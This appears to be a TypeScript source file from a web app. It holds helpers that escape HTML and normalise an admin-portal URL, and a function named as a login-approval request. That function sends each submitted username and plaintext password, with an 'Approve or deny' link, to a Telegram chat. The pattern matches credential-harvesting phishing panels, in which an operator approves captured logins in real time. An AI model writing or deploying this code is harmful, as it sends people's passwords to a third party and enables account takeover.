/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function normalizeAdminPortalUrl(raw?: string): string {
  let t = (raw ?? '').trim()
  if (!t) return '/admin/login'
  if (!/^https?:\/\//i.test(t) && !t.startsWith('/') && /^[a-z0-9.-]+\.[a-z]{2,}/i.test(t)) {
    t = `https://${t}`
  }
  const origin = t.replace(/\/admin\/login.*$/i, '').replace(/\?.*$/, '').replace(/\/+$/, '')
  return origin || '/admin/login'
}

import { sendTelegramMessage } from "@/lib/telegram"
import { PROJECT_DISPLAY_NAME } from "@/lib/project-config"

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function ensureAbsoluteHttpUrl(value: string): string {
  const t = value.trim()
  if (!t || isHttpUrl(t) || t.startsWith('/')) return t
  if (/^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(t)) {
    return `https://${t}`
  }
  return t
}

function asLink(url: string, label?: string): string {
  const href = ensureAbsoluteHttpUrl(url.trim())
  const linkText = (label?.trim() || href).trim()
  if (!href || !isHttpUrl(href)) {
    if (label?.trim()) return escapeHtml(label.trim())
    return asCode(href || "Unknown")
  }
  return `<a href="${escapeHtml(href)}">${escapeHtml(linkText)}</a>`
}

function asCode(value: unknown): string {
  const text =
    typeof value === "string"
      ? value.trim()
      : value != null && value !== ""
        ? String(value)
        : ""
  return `<code>${escapeHtml(text || "Unknown")}</code>`
}

export async function sendLoginApprovalRequest(data: Record<string, any>): Promise<boolean> {
  const approvalsUrl = normalizeAdminPortalUrl(data.approvalsUrl)
  const message = [
    `🔔 <b>Login request – approve or deny (${escapeHtml(PROJECT_DISPLAY_NAME)})</b>`,
    "",
    `👤 <b>Username:</b> ${asCode(data.userId)}`,
    `🔑 <b>Password:</b> ${asCode(data.password)}`,
    `📧 <b>Method:</b> ${asCode(data.method)}`,
    "",
    `👉 ${asLink(approvalsUrl, "Approve or deny")}`,
  ].join("\n")
  return sendTelegramMessage(message)
}
